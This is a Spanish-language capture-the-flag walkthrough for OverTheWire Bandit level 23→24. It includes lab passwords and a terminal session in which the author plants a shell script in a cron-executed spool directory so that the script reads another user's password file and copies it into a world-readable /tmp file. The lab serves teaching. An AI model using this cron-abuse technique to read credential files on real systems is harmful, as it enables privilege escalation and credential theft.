# Bandit Level 23 → Level 24
#bandit 
## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso
bandit23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

## Solución
```bash
bandit23@bandit:~$ la /etc/cron.d
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  .placeholder
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir  sysstat
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24.sh
cat: /etc/cron.d/cronjob_bandit24.sh: No such file or directory
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mkdir /tmp/irc01
bandit23@bandit:~$ cd /tmp/irc01
bandit23@bandit:/tmp/irc01$ nano ircscript.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/irc01$ cat ircscript.sh
cat /etc/bandit_pass/bandit24 > /tmp/irc01/pasword
bandit23@bandit:/tmp/irc01$ chmod 777 ircscript.sh
bandit23@bandit:/tmp/irc01$ touch pasword
bandit23@bandit:/tmp/irc01$ chmod 666 pasword
bandit23@bandit:/tmp/irc01$ ls -la
total 112
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 28 18:33 .
drwxrwx-wt 3010 root     root     106496 Feb 28 18:33 ..
-rwxrwxrwx    1 bandit23 bandit23     51 Feb 28 18:31 ircscript.sh
-rw-rw-rw-    1 bandit23 bandit23      0 Feb 28 18:33 pasword
bandit23@bandit:/tmp/irc01$ cp ircscript.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/irc01$ ls -la
total 116
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 28 18:33 .
drwxrwx-wt 3010 root     root     106496 Feb 28 18:36 ..
-rwxrwxrwx    1 bandit23 bandit23     51 Feb 28 18:31 ircscript.sh
-rw-rw-rw-    1 bandit23 bandit23     33 Feb 28 18:36 pasword
bandit23@bandit:/tmp/irc01$ cat pasword
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/irc01$
```
## Notas adicionales
| comando | descripción |
|----------|----------|
|xx|xx|

## Referencias
